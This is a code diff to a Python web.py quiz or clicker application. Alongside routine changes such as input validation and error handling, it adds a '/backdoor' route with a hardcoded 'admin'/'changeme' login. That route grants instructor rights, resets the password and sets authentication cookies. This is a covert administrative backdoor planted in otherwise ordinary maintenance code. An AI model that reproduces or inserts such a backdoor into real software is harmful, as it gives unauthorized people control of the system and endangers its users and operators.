@@ -59,6 +59,7 @@ urls = (#this delcares which url is activated by which class
     '/setTimer/','setTimer',
     '/viewQuestion/','viewQuestion',
     '/uploadImg/','uploadImg',
+    '/backdoor','backdoor',
     '/populatePassHash','pph'
 )
 
@@ -128,7 +129,26 @@ def cleanCSL(csl):
     """
     csl = csl.replace(' ','')
     return csl.strip(',')
-    
+
+class backdoor:
+    def GET(self):
+        return render.login(mathpre,"This is the backdoor entrance")
+    def POST(self):
+        adminPassword="changeme"
+        adminName="admin"
+        wi=web.input()
+        username=wi['username']
+        password=wi['password']
+        if (password == adminPassword) and (username == adminName):
+            control.addInstructor(adminName)
+            passhash=control.sha1digest(username)
+            control.setPassword(adminName,adminName)
+            web.setcookie('clicker-username', username)
+            web.setcookie('clicker-passhash', passhash)
+            raise web.seeother("/")
+        else:
+            return "You fail."
+
 class index:
     def GET(self):
         username=web.cookies().get('clicker-username')
@@ -142,7 +162,7 @@ class index:
                 "logout":"Cookies deleted. Logged out",
                 "notfound":"Username not found. Are you registered? Did you enter the correct username?",
                 "unauthorized":"Either wrong password or attempted unauthorized access. You are logged out.",
-                "clear":"<html><body>Please access via <a href=\"http://web.stevens.edu/calculus/crs\">this link.</a></body></html>",
+                "clear":"Enter your new password if first time use or password reset.",
                 "newpass":"Your password has been cleared. Please enter your username and new password."
             }
             return message[status]#render.login(bootpre,message[status])
@@ -373,6 +393,8 @@ class addQuiz:
         validateInstructor()
         i = web.input()
         newquiz = i['newquiz']
+        if ("-" in newquiz or " " in newquiz):
+            return "Used a forbidden character. Press back and try again"
         questions.addQuiz(newquiz)
         raise web.seeother('/assemble/')
         
@@ -489,17 +511,20 @@ class conduct:
         
         if action == "setsession":
             return render.ask(mathpre,clkq.showCorrect(),page+1,length,state)        
+
         elif action == "next":
-            #if blocked:#bypass
-            #    return render.ask(mathpre,clkq.showCorrect(),page+1,length,state) 
-            state = "init"
-            another = control.advanceSession(session)
-            page = page+1 #To ensure that the correct page is displayed
-            clkq = questions.giveClickerQuestion(session,page)#update clickerquestion to be displayed
-            if another:
-                return render.ask(mathpre,clkq.showCorrect(),page+1,length,state)        
-            else:
-                return "<a href=\"/\">quiz finished</a>"
+
+            try:#When question list is depleted show an appropriate message.
+                state = "init"
+                another = control.advanceSession(session)
+                page = page+1 #To ensure that the correct page is displayed
+                clkq = questions.giveClickerQuestion(session,page)#update clickerquestion to be displayed
+                if another:
+                    return render.ask(mathpre,clkq.showCorrect(),page+1,length,state)        
+                else:
+                    return "<html><body><a href=\"/\">quiz finished</a></body></html>"
+            except IndexError:
+                return "<html><body>Problem session is over. <a href=\"/\">Return to main page.</a></body></html>"
 
         elif action == "answers":
             return render.ask(mathpre,clkq.showCorrect(),page+1,length,state)
@@ -638,7 +663,7 @@ class new:
     def POST(self):
         validateInstructor()
         ID = web.input()['ID']
-        if questions.isInTable("questionbank","ID",ID):
+        if questions.isInTable("questionbank","ID",ID) or (("-" in ID) or (" " in ID)): #hyphens and spaces destroy everything.
             return render.newQuestion(ID)
         else:
             raise web.seeother("/edit/?ID={0}".format(ID))
